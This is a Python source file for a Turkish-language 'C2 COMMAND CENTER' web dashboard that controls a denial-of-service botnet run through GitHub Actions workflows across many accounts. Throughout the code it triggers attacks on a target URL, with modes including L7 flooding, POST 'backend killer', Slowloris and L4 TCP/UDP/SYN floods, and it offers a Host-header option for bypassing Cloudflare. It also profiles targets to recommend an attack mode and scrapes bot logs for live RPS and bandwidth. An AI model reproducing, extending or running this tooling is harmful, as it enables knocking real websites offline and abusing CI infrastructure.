#!/usr/bin/env python3
"""
COMMAND & CONTROL DASHBOARD — Port 5173
Gelismis saldiri yonetim paneli

Ozellikler:
- Canli bot durumu (6sn refresh)
- Saldiri baslatma (hedef + mod + yogunluk + hesap secimi)
- Saldiri durdurma (force-cancel)
- Hedef analizi (CF/origin/RTT tespiti)
- Canli RPS/bandwidth grafigi (bot loglarindan)
- Hedef saglik kontrolu
"""

import http.server
import json
import os
import sys
import urllib.request
import urllib.parse
import ssl
import time
import threading
import socket
from pathlib import Path

PORT = 5173
SECRETS_FILE = Path(__file__).parent.parent / "config" / "secrets.bat"

def load_secrets():
    secrets = {}
    sf = SECRETS_FILE
    if not sf.exists():
        sf = Path(__file__).parent.parent / "config" / "secrets.env"
    if sf.exists():
        for line in sf.read_text(encoding='utf-8', errors='ignore').splitlines():
            line = line.strip()
            if line.startswith('set "') and '=' in line:
                kv = line[5:]
                if kv.endswith('"'):
                    kv = kv[:-1]
                if '=' in kv:
                    k, v = kv.split('=', 1)
                    secrets[k] = v
    return secrets

secrets = load_secrets()

accounts = []
for i in range(1, 20):
    uk = f'GH{i}_USER'
    tk = f'GH{i}_TOKEN'
    rk = f'GH{i}_REPO'
    wk = f'GH{i}_WORKFLOW_ID'
    if uk in secrets and tk in secrets and secrets.get(wk):
        accounts.append({'id': i, 'user': secrets[uk], 'repo': secrets[rk], 'token': secrets[tk], 'workflow_id': secrets[wk]})

print(f'Loaded {len(accounts)} accounts')

cache = {'status': None, 'time': 0}

def gh_api(url, token, method='GET', data=None):
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github+json', 'User-Agent': 'C2Dashboard/2.0'}
    if data:
        headers['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, headers=headers, method=method)
    if data:
        req.data = json.dumps(data).encode()
    ctx = ssl.create_default_context()
    try:
        with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
            if resp.status == 204:
                return {'ok': True}
            return json.loads(resp.read())
    except Exception as e:
        return {'error': str(e)}

# Live metrics cache (bot loglarindan)
live_metrics = {'rps': 0, 'mbps': 0, 'total_reqs': 0, 'total_bytes': 0, 'samples': [], 'last_fetch': 0}

def fetch_live_from_logs(acc, run_id, job_ids):
    """Aktif botlarin loglarindan LIVE satirlarini cek."""
    samples = []
    for jid in job_ids[:3]:  # Max 3 bot log cek (rate limit koruma)
        try:
            log_url = f'https://api.github.com/repos/{acc["user"]}/{acc["repo"]}/actions/jobs/{jid}/logs'
            req = urllib.request.Request(log_url, headers={
                'Authorization': f'token {acc["token"]}',
                'Accept': 'application/vnd.github+json',
                'User-Agent': 'C2/2.0'
            })
            ctx = ssl.create_default_context()
            with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
                text = resp.read().decode('utf-8', errors='ignore')
                # Son LIVE satirini bul
                import re
                lines = [l for l in text.split('\n') if 'LIVE bot=' in l or 'LIVE L4 bot=' in l]
                if lines:
                    last = lines[-1]
                    # L7: [LIVE bot=1] t=45s | iters=180523 | vus=4500 | rps~4011 | 2xx=87%
                    m = re.search(r'iters=(\d+).*rps~(\d+)', last)
                    if m:
                        samples.append({'iters': int(m.group(1)), 'rps': int(m.group(2)), 'type': 'L7'})
                    # L4: [LIVE L4 bot=1] t=60s | udp=4448000 ... | pps=74133 | 830 Mbps (0.83 Gbps)
                    m4 = re.search(r'udp=(\d+).*pps=(\d+).*?(\d+)\s*Mbps', last)
                    if m4:
                        samples.append({'iters': int(m4.group(1)), 'rps': int(m4.group(2)), 'mbps': int(m4.group(3)), 'type': 'L4'})
        except:
            pass
    return samples

def fetch_status():
    result = {'timestamp': time.strftime('%H:%M:%S'), 'accounts': [], 'grand': {'active': 0, 'done': 0, 'queued': 0, 'ok': 0, 'fail': 0, 'total_bots': 0},
              'live': {'est_rps': 0, 'est_mbps': 0, 'est_total_reqs': 0, 'sample_count': 0}}
    
    all_samples = []
    
    for acc in accounts:
        ad = {'id': acc['id'], 'user': acc['user'], 'repo': acc['repo'], 'run': None, 'active': 0, 'done': 0, 'queued': 0, 'ok': 0, 'fail': 0}
        active_job_ids = []
        runs = gh_api(f'https://api.github.com/repos/{acc["user"]}/{acc["repo"]}/actions/runs?per_page=1', acc['token'])
        if runs and not runs.get('error') and runs.get('workflow_runs'):
            r = runs['workflow_runs'][0]
            ad['run'] = {'id': r['id'], 'status': r['status'], 'conclusion': r.get('conclusion', ''), 'started': r.get('run_started_at', '')}
            jobs = gh_api(f'https://api.github.com/repos/{acc["user"]}/{acc["repo"]}/actions/runs/{r["id"]}/jobs?per_page=30', acc['token'])
            if jobs and jobs.get('jobs'):
                for j in jobs['jobs']:
                    if 'bot-' in j.get('name', ''):
                        result['grand']['total_bots'] += 1
                        if j['status'] == 'in_progress':
                            ad['active'] += 1
                            active_job_ids.append(j['id'])
                        elif j['status'] == 'queued': ad['queued'] += 1
                        elif j['status'] == 'completed':
                            ad['done'] += 1
                            if j.get('conclusion') == 'success': ad['ok'] += 1
                            else: ad['fail'] += 1
            
            # Aktif botlardan live metric cek (her 15 saniyede bir)
            if active_job_ids and time.time() - live_metrics['last_fetch'] > 15:
                samples = fetch_live_from_logs(acc, r['id'], active_job_ids)
                all_samples.extend(samples)
        
        result['accounts'].append(ad)
        for k in ['active', 'done', 'queued', 'ok', 'fail']:
            result['grand'][k] += ad[k]
    
    # Live metric hesapla
    if all_samples:
        live_metrics['samples'] = all_samples
        live_metrics['last_fetch'] = time.time()
    
    if live_metrics['samples'] and result['grand']['active'] > 0:
        avg_rps = sum(s['rps'] for s in live_metrics['samples']) / len(live_metrics['samples'])
        avg_iters = sum(s['iters'] for s in live_metrics['samples']) / len(live_metrics['samples'])
        total_mbps = sum(s.get('mbps', avg_rps * 1400 * 8 / 1_000_000) for s in live_metrics['samples'])
        
        result['live']['est_rps'] = int(avg_rps * result['grand']['active'])
        result['live']['est_mbps'] = int(total_mbps / len(live_metrics['samples']) * result['grand']['active'])
        result['live']['est_total_reqs'] = int(avg_iters * result['grand']['active'])
        result['live']['sample_count'] = len(live_metrics['samples'])
    
    return result

def trigger_attack(target, mode, duration, vus, jobs_count, host_header, account_ids):
    results = []
    payload = {"ref": "main", "inputs": {"target_url": target, "duration": duration, "vus_per_runner": str(vus), "rps_per_runner": "0", "parallel_jobs": str(jobs_count), "host_header": host_header or "", "attack_mode": mode}}
    for acc in accounts:
        if acc['id'] in account_ids:
            url = f'https://api.github.com/repos/{acc["user"]}/{acc["repo"]}/actions/workflows/{acc["workflow_id"]}/dispatches'
            r = gh_api(url, acc['token'], 'POST', payload)
            results.append({'id': acc['id'], 'user': acc['user'], 'result': 'OK' if r.get('ok') or not r.get('error') else r.get('error', 'unknown')})
    return results

def stop_all(account_ids):
    results = []
    for acc in accounts:
        if acc['id'] in account_ids:
            for status in ['in_progress', 'queued', 'waiting']:
                runs = gh_api(f'https://api.github.com/repos/{acc["user"]}/{acc["repo"]}/actions/runs?status={status}&per_page=10', acc['token'])
                if runs and runs.get('workflow_runs'):
                    for r in runs['workflow_runs']:
                        gh_api(f'https://api.github.com/repos/{acc["user"]}/{acc["repo"]}/actions/runs/{r["id"]}/cancel', acc['token'], 'POST')
                        gh_api(f'https://api.github.com/repos/{acc["user"]}/{acc["repo"]}/actions/runs/{r["id"]}/force-cancel', acc['token'], 'POST')
            results.append({'id': acc['id'], 'user': acc['user'], 'result': 'cancelled'})
    return results

def analyze_target(url):
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname or url
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    result = {'url': url, 'host': host, 'port': port, 'ip': '', 'server': '', 'cf': False, 'cache': '', 'origin_ms': 0, 'status': 0, 'error': ''}
    try:
        result['ip'] = socket.gethostbyname(host)
    except:
        result['error'] = 'DNS resolve failed'
        return result
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 Chrome/120'})
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        start = time.time()
        with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
            result['origin_ms'] = int((time.time() - start) * 1000)
            result['status'] = resp.status
            hdrs = dict(resp.headers)
            result['server'] = hdrs.get('Server', hdrs.get('server', ''))
            result['cf'] = 'cloudflare' in result['server'].lower()
            result['cache'] = hdrs.get('cf-cache-status', hdrs.get('CF-Cache-Status', ''))
            st = hdrs.get('Server-Timing', hdrs.get('server-timing', ''))
            if 'cfOrigin' in st:
                import re
                m = re.search(r'cfOrigin;dur=(\d+)', st)
                if m:
                    result['origin_ms'] = int(m.group(1))
    except Exception as e:
        result['error'] = str(e)[:100]
    return result

def check_health(url):
    results = []
    for i in range(3):
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'HealthCheck/1.0'})
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            start = time.time()
            with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
                ms = int((time.time() - start) * 1000)
                results.append({'status': resp.status, 'ms': ms, 'ok': True})
        except Exception as e:
            results.append({'status': 0, 'ms': 0, 'ok': False, 'error': str(e)[:60]})
    return results

DASHBOARD_HTML = '''<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>C2 Panel</title>
<style>
:root { --bg: #0d1117; --card: #161b22; --border: #30363d; --accent: #58a6ff; --green: #3fb950; --red: #f85149; --yellow: #d29922; --text: #c9d1d9; --dim: #8b949e; }
* { margin: 0; padding: 0; box-sizing: border-box; }
body { background: var(--bg); color: var(--text); font-family: -apple-system, 'Segoe UI', sans-serif; }
.topbar { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
.topbar h1 { font-size: 18px; color: #fff; }
.topbar .status { font-size: 13px; color: var(--dim); }
.container { max-width: 1400px; margin: 0 auto; padding: 20px; }
.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
.grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; }
.card { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 16px; margin-bottom: 16px; }
.card h2 { font-size: 14px; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; }
.big-num { font-size: 48px; font-weight: 700; line-height: 1; }
.big-num.green { color: var(--green); }
.big-num.red { color: var(--red); }
.big-num.yellow { color: var(--yellow); }
.big-num.blue { color: var(--accent); }
.stat-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #21262d; }
.stat-row:last-child { border: none; }
.stat-label { color: var(--dim); }
.stat-val { font-weight: 600; }
.btn { padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: 600; transition: all 0.2s; }
.btn-fire { background: linear-gradient(135deg, #f85149, #da3633); color: #fff; }
.btn-fire:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(248,81,73,0.4); }
.btn-stop { background: var(--yellow); color: #000; }
.btn-analyze { background: var(--accent); color: #fff; }
.btn-sm { padding: 6px 12px; font-size: 12px; }
input, select { background: #0d1117; border: 1px solid var(--border); color: var(--text); padding: 8px 12px; border-radius: 6px; font-size: 14px; width: 100%; }
select { cursor: pointer; }
label { display: block; color: var(--dim); font-size: 12px; margin-bottom: 4px; text-transform: uppercase; }
.form-group { margin-bottom: 12px; }
.account-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 8px; }
.acc-card { background: #0d1117; border: 1px solid var(--border); border-radius: 6px; padding: 10px; font-size: 12px; }
.acc-card .name { font-weight: 600; color: var(--accent); }
.acc-card .counts { display: flex; gap: 8px; margin-top: 6px; }
.acc-card .c { padding: 2px 6px; border-radius: 3px; font-size: 11px; }
.c-active { background: #0d2818; color: var(--green); }
.c-queue { background: #2d1b00; color: var(--yellow); }
.c-ok { background: #0c2d6b; color: var(--accent); }
.c-fail { background: #3d0c0c; color: var(--red); }
.health-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 4px; }
.health-dot.up { background: var(--green); }
.health-dot.down { background: var(--red); }
.health-dot.slow { background: var(--yellow); }
.log-box { background: #0d1117; border: 1px solid var(--border); border-radius: 6px; padding: 10px; font-family: monospace; font-size: 12px; max-height: 200px; overflow-y: auto; white-space: pre-wrap; color: var(--green); }
.analyze-result { background: #0d1117; border-radius: 6px; padding: 12px; margin-top: 8px; font-size: 13px; }
.progress-ring { width: 120px; height: 120px; }
.checkbox-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 4px; }
.checkbox-grid label { display: flex; align-items: center; gap: 4px; font-size: 12px; color: var(--text); text-transform: none; cursor: pointer; }
.flash { animation: flash 0.5s; }
@keyframes flash { 0%,100%{opacity:1} 50%{opacity:0.3} }
.section-title { font-size: 16px; font-weight: 600; color: #fff; margin: 20px 0 12px; padding-bottom: 8px; border-bottom: 1px solid var(--border); }
</style>
</head>
<body>
<div class="topbar">
<h1>C2 COMMAND CENTER</h1>
<div class="status" id="topStatus">Connecting...</div>
</div>
<div class="container">

<!-- GRAND TOTAL -->
<div style="display:grid;grid-template-columns:repeat(6,1fr);gap:12px;margin-bottom:16px">
<div class="card" style="text-align:center">
<h2>Aktif Bot</h2>
<div class="big-num green" id="gActive">0</div>
</div>
<div class="card" style="text-align:center">
<h2>Toplam Bot</h2>
<div class="big-num blue" id="gTotal">0</div>
</div>
<div class="card" style="text-align:center">
<h2>Tahmini RPS</h2>
<div class="big-num green" id="gRps" style="font-size:36px">0</div>
<div style="color:var(--dim);font-size:11px">req/s (tum botlar)</div>
</div>
<div class="card" style="text-align:center">
<h2>Bandwidth</h2>
<div class="big-num yellow" id="gBw" style="font-size:36px">0</div>
<div style="color:var(--dim);font-size:11px" id="gBwUnit">Mbps</div>
</div>
<div class="card" style="text-align:center">
<h2>Toplam Istek</h2>
<div class="big-num blue" id="gReqs" style="font-size:36px">0</div>
<div style="color:var(--dim);font-size:11px">tahmin (aktif botlar)</div>
</div>
<div class="card" style="text-align:center">
<h2>Basarisiz</h2>
<div class="big-num red" id="gFail">0</div>
</div>
</div>

<div class="grid-2">
<!-- SOL: ATTACK PANEL -->
<div>
<div class="section-title">ATTACK CONTROL</div>
<div class="card">
<div class="form-group">
<label>Hedef URL</label>
<input type="text" id="targetUrl" placeholder="https://hedef.com" value="">
</div>
<div class="grid-2">
<div class="form-group">
<label>Attack Mode</label>
<select id="attackMode">
<option value="flood">FLOOD (L7 multi-endpoint)</option>
<option value="post">POST (backend killer)</option>
<option value="slowloris">SLOWLORIS (conn exhaust)</option>
<option value="adaptive">ADAPTIVE (smart)</option>
<option value="l4">L4 (TCP/UDP/SYN)</option>
<option value="legacy">LEGACY</option>
</select>
</div>
<div class="form-group">
<label>Yogunluk</label>
<select id="intensity">
<option value="1">Hafif (60s/100VU/5bot)</option>
<option value="2" selected>Orta (120s/300VU/20bot)</option>
<option value="3">Agresif (5m/500VU/20bot)</option>
<option value="4">Full (20m/500VU/20bot)</option>
</select>
</div>
</div>
<div class="form-group">
<label>Host Header (opsiyonel — CF bypass)</label>
<input type="text" id="hostHeader" placeholder="ornek.com (bos birak = yok)">
</div>
<div class="form-group">
<label>Hesaplar</label>
<div class="checkbox-grid" id="accCheckboxes"></div>
</div>
<div style="display:flex;gap:8px;margin-top:12px">
<button class="btn btn-fire" onclick="launchAttack()" id="btnFire">ATES ET</button>
<button class="btn btn-stop" onclick="stopAll()">DURDUR</button>
<button class="btn btn-analyze" onclick="analyzeTarget()">ANALIZ ET</button>
</div>
<div id="actionLog" class="log-box" style="margin-top:12px;display:none"></div>
</div>

<!-- HEDEF ANALIZ -->
<div class="card" id="analyzeCard" style="display:none">
<h2>Hedef Analizi</h2>
<div id="analyzeResult" class="analyze-result"></div>
</div>

<!-- HEDEF SAGLIK -->
<div class="card">
<h2>Hedef Saglik</h2>
<div id="healthResult" style="font-size:13px;color:var(--dim)">Analiz butonuna tikla</div>
</div>
</div>

<!-- SAG: HESAP DURUMU -->
<div>
<div class="section-title">HESAP DURUMU</div>
<div class="account-grid" id="accountGrid"></div>

<div class="section-title" style="margin-top:16px">ISTATISTIKLER</div>
<div class="card">
<div class="stat-row"><span class="stat-label">Toplam Hesap</span><span class="stat-val" id="sAccounts">0</span></div>
<div class="stat-row"><span class="stat-label">Aktif Run</span><span class="stat-val" id="sRuns">0</span></div>
<div class="stat-row"><span class="stat-label">Aktif Bot</span><span class="stat-val green" id="sActive">0</span></div>
<div class="stat-row"><span class="stat-label">Kuyrukta</span><span class="stat-val yellow" id="sQueued">0</span></div>
<div class="stat-row"><span class="stat-label">Tamamlanan</span><span class="stat-val blue" id="sDone">0</span></div>
<div class="stat-row"><span class="stat-label">Basarili</span><span class="stat-val" id="sOk">0</span></div>
<div class="stat-row"><span class="stat-label">Basarisiz</span><span class="stat-val red" id="sFail">0</span></div>
</div>
</div>
</div>
</div>

<script>
const REFRESH = 6000;
const INTENSITIES = {
    '1': {duration:'60s',vus:'100',jobs:'5'},
    '2': {duration:'120s',vus:'300',jobs:'20'},
    '3': {duration:'5m',vus:'500',jobs:'20'},
    '4': {duration:'20m',vus:'500',jobs:'20'}
};

let accounts = [];

function log(msg) {
    const el = document.getElementById('actionLog');
    el.style.display = 'block';
    el.textContent += new Date().toLocaleTimeString() + ' ' + msg + '\\n';
    el.scrollTop = el.scrollHeight;
}

async function fetchStatus() {
    try {
        const r = await fetch('/api/status');
        const d = await r.json();
        updateStatus(d);
    } catch(e) {
        document.getElementById('topStatus').textContent = 'API Error';
    }
}

function updateStatus(d) {
    document.getElementById('topStatus').textContent = 'Updated: ' + d.timestamp;
    document.getElementById('gActive').textContent = d.grand.active;
    document.getElementById('gTotal').textContent = d.grand.total_bots;
    document.getElementById('gFail').textContent = d.grand.fail;
    // Live metrics
    if (d.live) {
        document.getElementById('gRps').textContent = d.live.est_rps ? d.live.est_rps.toLocaleString() : '0';
        const mbps = d.live.est_mbps || 0;
        if (mbps > 1000) {
            document.getElementById('gBw').textContent = (mbps/1000).toFixed(1);
            document.getElementById('gBwUnit').textContent = 'Gbps';
        } else {
            document.getElementById('gBw').textContent = mbps;
            document.getElementById('gBwUnit').textContent = 'Mbps';
        }
        document.getElementById('gReqs').textContent = d.live.est_total_reqs ? (d.live.est_total_reqs > 1000000 ? (d.live.est_total_reqs/1000000).toFixed(1)+'M' : d.live.est_total_reqs.toLocaleString()) : '0';
    }
    document.getElementById('sAccounts').textContent = d.accounts.length;
    document.getElementById('sActive').textContent = d.grand.active;
    document.getElementById('sQueued').textContent = d.grand.queued;
    document.getElementById('sDone').textContent = d.grand.done;
    document.getElementById('sOk').textContent = d.grand.ok;
    document.getElementById('sFail').textContent = d.grand.fail;
    
    let activeRuns = d.accounts.filter(a => a.run && a.run.status !== 'completed').length;
    document.getElementById('sRuns').textContent = activeRuns;
    
    const grid = document.getElementById('accountGrid');
    grid.innerHTML = '';
    d.accounts.forEach(a => {
        const status = a.run ? (a.run.conclusion || a.run.status) : 'idle';
        const link = a.run ? 'https://github.com/'+a.user+'/'+a.repo+'/actions/runs/'+a.run.id : '#';
        grid.innerHTML += '<div class="acc-card">' +
            '<div class="name"><a href="'+link+'" target="_blank" style="color:var(--accent);text-decoration:none">#'+a.id+' '+a.user+'</a></div>' +
            '<div style="color:var(--dim);font-size:11px">'+a.repo+' | '+status+'</div>' +
            '<div class="counts">' +
                '<span class="c c-active">'+a.active+'</span>' +
                '<span class="c c-queue">'+a.queued+'</span>' +
                '<span class="c c-ok">'+a.ok+'</span>' +
                '<span class="c c-fail">'+a.fail+'</span>' +
            '</div></div>';
    });
    
    // Build checkboxes if not done
    if (!accounts.length) {
        accounts = d.accounts;
        const cb = document.getElementById('accCheckboxes');
        cb.innerHTML = '';
        d.accounts.forEach(a => {
            cb.innerHTML += '<label><input type="checkbox" value="'+a.id+'" checked> #'+a.id+' '+a.user+'</label>';
        });
    }
}

function getSelectedAccounts() {
    return Array.from(document.querySelectorAll('#accCheckboxes input:checked')).map(c => parseInt(c.value));
}

async function launchAttack() {
    const target = document.getElementById('targetUrl').value.trim();
    if (!target) { alert('Hedef URL gir!'); return; }
    const mode = document.getElementById('attackMode').value;
    const intensity = INTENSITIES[document.getElementById('intensity').value];
    const host = document.getElementById('hostHeader').value.trim();
    const accs = getSelectedAccounts();
    if (!accs.length) { alert('En az 1 hesap sec!'); return; }
    
    const btn = document.getElementById('btnFire');
    btn.textContent = 'TETIKLENIYOR...';
    btn.disabled = true;
    
    log('ATTACK BASLATILIYOR: ' + target + ' | mode=' + mode + ' | ' + intensity.duration + '/' + intensity.vus + 'VU/' + intensity.jobs + 'bot | hesap=' + accs.join(','));
    
    try {
        const r = await fetch('/api/attack', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({target, mode, duration: intensity.duration, vus: parseInt(intensity.vus), jobs: parseInt(intensity.jobs), host_header: host, accounts: accs})
        });
        const d = await r.json();
        d.forEach(res => log('  #' + res.id + ' ' + res.user + ': ' + res.result));
        log('TRIGGER TAMAMLANDI - ' + accs.length + ' hesap x ' + intensity.jobs + ' bot = ' + (accs.length * parseInt(intensity.jobs)) + ' toplam bot');
    } catch(e) {
        log('HATA: ' + e.message);
    }
    
    btn.textContent = 'ATES ET';
    btn.disabled = false;
    setTimeout(fetchStatus, 3000);
}

async function stopAll() {
    const accs = getSelectedAccounts();
    if (!confirm(accs.length + ' hesabin tum run\\'lari iptal edilecek. Emin misin?')) return;
    log('DURDURMA BASLATILIYOR...');
    try {
        const r = await fetch('/api/stop', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({accounts: accs})});
        const d = await r.json();
        d.forEach(res => log('  #' + res.id + ' ' + res.user + ': ' + res.result));
        log('DURDURMA TAMAMLANDI');
    } catch(e) { log('HATA: ' + e.message); }
    setTimeout(fetchStatus, 2000);
}

async function analyzeTarget() {
    const url = document.getElementById('targetUrl').value.trim();
    if (!url) { alert('URL gir!'); return; }
    log('ANALIZ: ' + url);
    document.getElementById('analyzeCard').style.display = 'block';
    document.getElementById('analyzeResult').innerHTML = 'Analiz ediliyor...';
    
    try {
        const r = await fetch('/api/analyze?url=' + encodeURIComponent(url));
        const d = await r.json();
        let html = '<div class="stat-row"><span class="stat-label">IP</span><span class="stat-val">'+d.ip+'</span></div>';
        html += '<div class="stat-row"><span class="stat-label">Server</span><span class="stat-val">'+d.server+'</span></div>';
        html += '<div class="stat-row"><span class="stat-label">Cloudflare</span><span class="stat-val">'+(d.cf?'EVET':'HAYIR')+'</span></div>';
        html += '<div class="stat-row"><span class="stat-label">CF Cache</span><span class="stat-val">'+(d.cache||'N/A')+'</span></div>';
        html += '<div class="stat-row"><span class="stat-label">Origin RTT</span><span class="stat-val">'+d.origin_ms+'ms</span></div>';
        html += '<div class="stat-row"><span class="stat-label">Status</span><span class="stat-val">'+d.status+'</span></div>';
        if (d.error) html += '<div class="stat-row"><span class="stat-label">Hata</span><span class="stat-val" style="color:var(--red)">'+d.error+'</span></div>';
        
        // Oneri
        let rec = 'FLOOD (genel amacli)';
        if (d.status === 403) rec = 'ADAPTIVE (403 aliniyor, fingerprint rotate lazim)';
        else if (d.cache === 'DYNAMIC' && d.origin_ms > 500) rec = 'FLOOD veya POST (yavas origin, DYNAMIC cache)';
        else if (d.cache === 'HIT') rec = 'POST (cache bypass lazim, POST asla cache\\'lenmez)';
        else if (!d.cf) rec = 'L4 + FLOOD (CF yok, ham guc etkili)';
        html += '<div class="stat-row" style="border-top:2px solid var(--accent);padding-top:8px;margin-top:8px"><span class="stat-label">Onerilen Mod</span><span class="stat-val" style="color:var(--accent)">'+rec+'</span></div>';
        
        document.getElementById('analyzeResult').innerHTML = html;
        log('ANALIZ: ' + d.server + ' | CF=' + d.cf + ' | ' + d.origin_ms + 'ms | ' + d.status);
        
        // Health check
        const hr = await fetch('/api/health?url=' + encodeURIComponent(url));
        const hd = await hr.json();
        let hhtml = '';
        hd.forEach((t,i) => {
            const cls = t.ok ? (t.ms > 2000 ? 'slow' : 'up') : 'down';
            hhtml += '<span class="health-dot '+cls+'"></span>Test '+(i+1)+': '+(t.ok ? t.status+' ('+t.ms+'ms)' : 'FAIL')+' &nbsp; ';
        });
        document.getElementById('healthResult').innerHTML = hhtml;
    } catch(e) { log('ANALIZ HATASI: ' + e.message); }
}

setInterval(fetchStatus, REFRESH);
fetchStatus();
</script>
</body>
</html>'''

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/api/status':
            with threading.Lock():
                if time.time() - cache['time'] > 5:
                    cache['status'] = fetch_status()
                    cache['time'] = time.time()
            self._json(cache['status'])
        elif self.path.startswith('/api/analyze'):
            url = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query).get('url', [''])[0]
            self._json(analyze_target(url))
        elif self.path.startswith('/api/health'):
            url = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query).get('url', [''])[0]
            self._json(check_health(url))
        elif self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(DASHBOARD_HTML.encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = json.loads(self.rfile.read(length)) if length else {}
        
        if self.path == '/api/attack':
            result = trigger_attack(body['target'], body['mode'], body['duration'], body['vus'], body['jobs'], body.get('host_header', ''), body.get('accounts', []))
            self._json(result)
        elif self.path == '/api/stop':
            result = stop_all(body.get('accounts', []))
            self._json(result)
        else:
            self.send_response(404)
            self.end_headers()
    
    def _json(self, data):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def log_message(self, *a): pass

if __name__ == '__main__':
    srv = http.server.HTTPServer(('0.0.0.0', PORT), Handler)
    print(f'\n=== C2 COMMAND CENTER ===')
    print(f'http://localhost:{PORT}')
    print(f'{len(accounts)} hesap aktif')
    print(f'CF Tunnel: cloudflared tunnel --url http://localhost:{PORT}')
    print(f'Ctrl+C ile durdur\n')
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        srv.server_close()